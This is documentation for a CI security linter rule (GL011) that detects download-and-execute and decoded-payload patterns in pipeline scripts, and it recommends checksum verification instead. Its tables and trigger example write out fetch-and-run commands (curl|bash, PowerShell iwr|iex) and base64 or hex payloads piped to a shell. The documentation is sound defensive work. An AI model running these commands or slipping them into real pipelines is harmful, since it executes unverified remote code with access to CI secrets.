# GL011 — Download-and-execute or opaque decoded payload in script

**Severity:** error  
**OWASP:** [CICD-SEC-3 – Dependency Chain Abuse](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse)

## What glsec checks

glsec flags both remote code downloaded and executed without integrity verification (for example, `curl | bash`) and opaque base64 or hex payloads decoded and executed in an interpreter. A decoded payload may come from inline text, a CI variable, or a local file rather than a network download:

| Pattern | Example |
|---------|---------|
| Pipe to shell | `curl URL \| bash` |
| Pipe to sh | `wget -qO- URL \| sh` |
| Pipe to Python | `curl URL \| python3` |
| Pipe to Ruby/Perl/Node | `curl URL \| ruby` |
| Pipe through a wrapper | `curl URL \| sudo -E bash -`, `\| doas sh`, `\| su -c sh`, `\| runuser -u app -- bash`, `\| env FOO=1 sh` |
| Process substitution | `python3 <(curl URL)` |
| Multi-stage pipe | `curl URL \| base64 -d \| bash` |
| Command substitution | `bash -c "$(curl URL)"` |
| Substitution piped to shell | `echo "$(curl URL)" \| bash` |
| Inline or variable-based base64 payload | `echo "…" \| base64 -d \| bash`, `echo "$SETUP_B64" \| base64 -d \| sh`, `base64 -d < $SETUP_B64 \| bash` |
| Inline hex payload | `echo 6375… \| xxd -r -p \| bash`, `printf '\x63\x75…' \| sh`, `echo -e "\x63…" \| sh` |
| Inline base32 payload | `printf %s OBZGS3TU… \| base32 -d \| sh` |
| Download-then-execute | `curl URL -o f.sh && bash f.sh` |
| Redirect-then-execute | `curl URL > f.sh; sh f.sh` |
| PowerShell pipe to `iex` | `iwr URL \| iex`, `irm URL \| Invoke-Expression` |
| PowerShell download as `iex` argument | `iex (irm URL)`, `iex "& {$(irm URL)}"`, `iex ((New-Object Net.WebClient).DownloadString(URL))` |

GL011 distinguishes a real remote download from a payload decoded directly from inline text, a CI variable or a local file. Both forms still get a finding: for decoded content with no download, the message describes the opaque payload executed by an interpreter rather than claiming that remote code was downloaded. An unrelated `curl` or `wget` command on the same line does not change that provenance. Encoded scripts remain difficult to review, even when the encoded data is stored locally or provided by a CI variable.

A line that also runs an integrity check (`sha256sum`, `sha512sum`, `shasum`, `gpg --verify`, `cosign verify`) is treated as verified and not flagged. A download piped into a keyring tool (`gpg --dearmor`, `gpg --import`, `apt-key add`) is a keyring install, not execution — the downloaded bytes are a key, never run — so the standard Debian/Ubuntu line `wget -O- …key.pub | gpg --dearmor -o /usr/share/keyrings/x.gpg && sh -c 'echo "deb …" >> …'` is not flagged, even though it ends in an `sh -c` that only appends an apt source line (#1099). A `save-to-file-then-execute` finding requires the save (`-o`/`>`) to belong to the download command itself, not to a tool it is piped into. Pipes or shell tokens that appear only inside a quoted string literal do not trigger. The piped interpreter may be written with a path (`curl … | /bin/bash`, `| /usr/bin/python3`); it is read the same as the bare name. PowerShell commands are matched inside quotes too, because they are usually passed quoted (`pwsh -c "…"`); PowerShell keywords match in any case. `Invoke-Expression` on a local string or file (`iex $cmd`, `iex (Get-Content f.ps1 -Raw)`) is not flagged, nor is an `iex` in a later statement after `;`.

**Embedded payloads (warn).** A line that decodes a long literal payload, at least 60 base64 or hex characters given to `echo`, `printf` or a here-string, into a file or another program is reported with its own message at severity warn: `echo <base64> | base64 -d > /tmp/.c`, `… | base64 -d | tar -xz`, `base64 -d <<< <base64> > f`, `echo <hex> | xxd -r -p > f`. The content is unreadable in review, and this is how an injected job can hide a miner's configuration (#1306). Decoded into a shell or interpreter, the line gets the execute finding above instead. Base32 is covered as well (`base32 -d`), both decoded straight into a shell (error) and as a long literal written to a file (warn). When a decoded file is **run as a script later in the same job** — `… | base32 -d > .sweep` then `sh .sweep` — the finding is raised to an execution error, since the executed code is hidden from review; files that are only passed as data arguments to that script (`sh .sweep .patterns .config`) keep the warn-level embedded-payload finding. Not reported: shorter literals (a base64 `user:password` or test string), a variable or file as the source (`echo "$CONFIG_B64" | base64 -d > f`), decoded output that only goes to the job log or `/dev/null`, and encoding (`base64` without `-d`).

Each line of a `|` block (with `\` continuations joined) is checked on its own, and the finding points at that line. The script a new shell runs is checked as lines of its own too: the argument of `sh -c`/`bash -c` and the other POSIX shells (also `bash -ec`, `docker run img sh -c …`, `kubectl exec pod -- sh -c …`, `sudo bash -c …`) and the remote command of `ssh host '…'`, so `sh -c "curl … | sh"` is reported. An interpreter given its program on the command line reads the piped input as data, so `curl … | python3 -c "import json, sys; …"` is not reported. That covers `-c` for shells and Python (also bundled, as in `bash -ec`), `-e`/`--eval`/`-p`/`--print` for Node.js, and `-e`/`-E` for Perl and Ruby, also bundled (`perl -ne`, `perl -lane`). `curl … | bash -e` still runs the download: `-e` is errexit for a shell. `| node`, `| perl -w`, `| python3 -` and `| sh -s` read the program from the pipe and are reported.

## Trigger example

```yaml
setup:
  script:
    - curl -sSL https://install.example.com/setup.sh | bash
    - wget -qO- https://raw.githubusercontent.com/org/repo/main/install.sh | sh
    - python3 <(curl -s https://example.com/bootstrap.py)
    - echo "$(curl -s https://example.com/payload)" | bash
    - echo "ZWNobyBwd25lZAo=" | base64 -d | bash
    - curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
    - curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
    - echo 6375726c2e2e2e | xxd -r -p | bash
    - pwsh -c "iwr https://example.com/install.ps1 | iex"
    - powershell -Command "iex (irm https://example.com/install.ps1)"
    - echo eyJwb29scyI6W3sidXJsIjoicG9vbC5leGFtcGxlLmNvbTo0NDMiLCJ0bHMiOnRydWV9XX0= | base64 -d > /tmp/.c
```

## Safe alternative

Download the script first, verify its checksum, then execute:

```yaml
setup:
  script:
    - curl -sSLO https://install.example.com/setup.sh
    - echo "a3b4c5d6…  setup.sh" | sha256sum --check
    - bash setup.sh
```

Or better: commit the script to the repository and reference it locally, removing the runtime network dependency entirely.

## Why this matters

HTTPS provides transport-level security but no content integrity guarantee. If the script host is compromised, the pipeline will silently execute malicious code in the CI environment with access to all secrets, tokens, and build artifacts. Unlike a committed dependency, the executed code is unversioned and cannot be audited in pull request reviews or git history.

## Known attacks

The Codecov Bash Uploader compromise of 2021: CI jobs piped an altered script into a shell, and it sent their environment to the attackers.
